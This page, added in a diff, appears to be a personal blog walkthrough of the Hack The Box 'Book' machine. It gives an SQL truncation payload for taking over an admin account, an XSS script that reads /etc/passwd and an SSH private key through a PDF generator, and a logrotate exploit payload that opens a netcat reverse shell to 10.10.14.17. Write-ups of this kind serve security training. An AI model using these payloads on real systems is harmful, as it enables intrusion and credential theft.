@@ -1,0 +1,245 @@
+<!--
+Author: W3layouts
+Author URL: http://w3layouts.com
+-->
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>My Website a Personal Portfolio Category Bootstrap Responsive Website Template </title>
+    <!-- web fonts -->
+    <link href="//fonts.googleapis.com/css?family=Nunito:400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="//fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <!-- //web fonts -->
+    <!-- Template CSS -->
+    <link rel="stylesheet" href="/assets/css/style-starter.css">
+  </head>
+  <body>
+
+<section class="w3l-bootstrap-header">
+  <nav class="navbar navbar-expand-lg navbar-light py-lg-3 py-2">
+    <div class="container">
+      <a class="navbar-brand" href="index.html"> My Website</a>
+      <!-- if logo is image enable this   
+    <a class="navbar-brand" href="#index.html">
+        <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
+    </a> -->
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon fa fa-bars"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/Projects.html">Projects</a>
+          </li>
+        </ul>
+        
+      </div>
+    </div>
+  </nav>
+</section>
+<section class="w3l-about-breadcrum">
+  <div class="breadcrum-bg">
+    <div class="container py-5">
+      <p><a href="index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Book</p>
+     </div>
+  </div>
+</section>
+<!-- w3l-content-photo-5 -->
+<div class="w3l-content-photo-5 py-5" id="about">
+	<div class="content-main pt-lg-5 pt-md-3 pb-0">
+		<div class="container">
+            <div style="text-align:center;padding-top: 10px">
+           					<a ><img src="/Posts/Book/card.png" class="img-fluid" alt="content-photo" ></a>
+                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Book</h3>
+					          <p class="mb-2">Posted on 7/9</p>
+                    <p class="mb-2">Source: <a href="https://www.hackthebox.eu/" target="_blank" style="color: #33cc33;text-align:right"> hackthebox</a></p>
+                    <h3 class="mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Enumeration</h3>
+                    <p class="mb-2">Here's what showed up for host enumeration. 
+                      Scanning all the ports with the -p- flag didn't yield any more results.</p>
+                    <a ><img src="/Posts/Book/5.png" class="img-fluid" alt="content-photo" ></a>            
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">In the web app we get an account login and account creation page.  </p>
+                    <a ><img src="/Posts/Book/1.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                      I started gobuster in the background and then I started making an account for the page.
+                      I used basic credentials for my account 4321@4321.com:4321 and I was able to login.
+                      I found two interesting pages: a file upload page and an admin email.
+                    </p>
+                    <a ><img src="/Posts/Book/2.png" class="img-fluid" alt="content-photo" ></a>
+                    <figcaption style="padding-top: 40px; padding-bottom: 30px">The file submission page</figcaption>
+                    <a ><img src="/Posts/Book/3.png" class="img-fluid" alt="content-photo" ></a>
+                    <figcaption style="padding-top: 40px; padding-bottom: 30px">Contact page</figcaption>
+                    <p class="mb-2" style="font-weight:100">Let's go check back on the web enumeration.</p>
+                    <a ><img src="/Posts/Book/4.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                      Most of the pages we found were available in the portal, with the exception of db.php and /admin. Going to db.php gave a blank site, but /admin prompted us with a login page.             
+                    </p>
+                    <a ><img src="/Posts/Book/6.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    Since I had the email, I tried testing out a few basic passwords but they didn't yield any results. 
+                    I tried creating an account with the admin email, here's what the request looked like.
+                    </p>
+                    <a ><img src="/Posts/Book/7.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    I fuzzed the parameters and I eventually created an admin account with the following: <br>
+                    name=test&email=admin%40book.htb x&passwd=test <br>
+                    I found this article afterwards but here <a href="https://resources.infosecinstitute.com/sql-truncation-attack/" target="_blank" style="color: #33cc33;text-align:right"> is why it worked.</a>. Here's what the admin panel looked like.
+                    </p>
+                    <a ><img src="/Posts/Book/8.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    I found a few interesting things:
+                    </p>
+                    <a ><img src="/Posts/Book/9.png" class="img-fluid" alt="content-photo" ></a>   
+                    <figcaption style="padding-top: 40px; padding-bottom: 30px">
+                    A download page for a pdf with the login users and a pdf of all the books in the collection
+                    I went back to the user collection submission page and submitted a collection with test:test and a php reverse shell to see if we can trigger it.
+                    But, it didn't upload like I thought it would.
+                    </figcaption>                     
+                    <a ><img src="/Posts/Book/10.png" class="img-fluid" alt="content-photo" ></a>
+                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">User</h3>
+                   
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    I looked up any vulnerability with a pdf upload and I came across this <a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html" target="_blank" style="color: #33cc33;text-align:right"> article.</a>
+                    Essentially, I can use XSS to read certain files in the system. With the title/author input as <br>
+                    <a><</a>script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();<<a>/script></a>  <br>            
+                    we can read /etc/passwd when we download the collection pdf from the admin panel.
+                    </p>
+                    <a ><img src="/Posts/Book/11.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    We can see users root, mysql and reader. 
+                    Maybe we can alter the request to read an ssh key by changing the path to ///home/reader/.ssh/id_rsa?
+                    Here's the setup, the uploaded file doesn't really matter.
+                    </p>
+                    <a ><img src="/Posts/Book/12.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                     Wait a few seconds and download the file again, and we get our ssh key!
+                    </p>
+                    <a ><img src="/Posts/Book/13.png" class="img-fluid" alt="content-photo" ></a>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    Some people struggled with formatting issues regarding the font size, but I copied the key by opening the image from firefox, pasting it into nano,
+                    and then used the first character of each line so I know when to start a new line and it worked without problems.
+                    I changed the permissions on the key and was able to ssh and read user.txt.
+                    </p>
+                    <a ><img src="/Posts/Book/14.png" class="img-fluid" alt="content-photo" ></a>
+                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Privilege Escalation</h3>
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    There was nothing really interesting in reader's home but some empty backup files. Just some empty files named access.log and access.log.1.
+                    Web application files are usually stored in /var/www/html and looking at the previously empty page db.php, I found mysql credentials.
+                    </p>
+                    <a ><img src="/Posts/Book/15.png" class="img-fluid" alt="content-photo" ></a>                 
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    I looked around the database and didn't find anything that helped. 
+                    I ran LinEnum.sh and pspy. LinEnum didn't show any interesting but pspy4 showed this interesting process.
+                  </p>
+                  <a ><img src="/Posts/Book/16.png" class="img-fluid" alt="content-photo" ></a>    
+                  <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                  This process along with the backup files made me suspicious. 
+                  I looked for any logrotate exploits and I found <a href="https://github.com/whotwagner/logrotten" target="_blank" style="color: #33cc33;text-align:right"> 
+                  this article</a> which allows me to execute a file as root. I downloaded and compiled the code and sent it over to the vulnerable machine with python HTTP.
+                  I created the payload which would place root's ssh key into reader's home, and then I could ssh as root. 
+                  </p>
+                  <a ><img src="/Posts/Book/18.png" class="img-fluid" alt="content-photo" ></a>  
+                  <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                  However, after a few attempts the file wasn't being written. So i changed the payload to <br>
+                  echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash 10.10.14.17 1234 &; cat /root/.ssh/root.txt > /tmp/loot.txt); fi" > hackermans <br>
+                  just in case. And instead of waiting for the process to run, it was possible to trigger it by echoing something into /home/reader/backups/access.log.
+
+                  </p>
+                    <a ><img src="/Posts/Book/19.png" class="img-fluid" alt="content-photo" ></a>  
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    On my listener, the shell was only open for a few seconds so I decided to read the root ssh key.
+                     If you find yourself with a reverse shell that closes quickly, you can type commands while your waiting for your connection, and when the shell arrives, the commands are automatically sent into the shell. 
+                    </p>
+                    <a ><img src="/Posts/Book/20.png" class="img-fluid" alt="content-photo" ></a>  
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                      As you can see, I was three characters away from reading the root flag before the shell closed. 
+                    </p>
+                    <a ><img src="/Posts/Book/21.png" class="img-fluid" alt="content-photo" ></a>  
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    I added the neccessary permissions to the key and I was able to ssh as root and read the flag. 
+                    I checked /tmp to see if root's ssh key was copied to /tmp. 
+                    </p>
+                    <a ><img src="/Posts/Book/22.png" class="img-fluid" alt="content-photo" ></a>  
+                    <p class="mb-2" style="font-weight:100;padding-top: 40px; padding-bottom: 30px">
+                    And it was! This box was interesting in that 
+                    I realized it's better to prioritize ssh keys as opposed to a reverse shell if you have the option.
+                    </p>
+                    </div>            
+     </div>
+  </div>  
+</div>
+
+ <section class="w3l-footer-29-main" id="footer">
+  <div class="footer-29 text-center">
+      <div class="container">
+        
+          <div class="bottom-copies text-center">
+              <p class="copy-footer-29">© 2020 My Website. All rights reserved | Designed by <a href="https://w3layouts.com">W3layouts</a></p>
+               
+          </div>
+      </div>
+  </div>
+   <!-- move top -->
+  <button onclick="topFunction()" id="movetop" title="Go to top">
+              <span class="fa fa-angle-up"></span>
+                 </button>
+                 <script>
+                     // When the user scrolls down 20px from the top of the document, show the button
+                     window.onscroll = function () {
+                         scrollFunction()
+                     };
+              
+                     function scrollFunction() {
+                         if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                             document.getElementById("movetop").style.display = "block";
+                         } else {
+                             document.getElementById("movetop").style.display = "none";
+                         }
+                     }
+              
+                     // When the user clicks on the button, scroll to the top of the document
+                     function topFunction() {
+                         document.body.scrollTop = 0;
+                         document.documentElement.scrollTop = 0;
+                     }
+                 </script>
+                 <!-- /move top -->
+</section>
+<!-- // grids block 5 -->
+<script src="assets/js/jquery-3.3.1.min.js"></script>
+<!-- //footer-28 block -->
+</section>
+
+<script>
+    $(function () {
+      $('.navbar-toggler').click(function () {
+        $('body').toggleClass('noscroll');
+      })
+    });
+  </script>
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
+  </script>
+  
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
+  </script>
+
+<!-- Smooth scrolling -->
+
+
+
+</body>
+
+</html>
+<!-- // grids block 5 -->
+
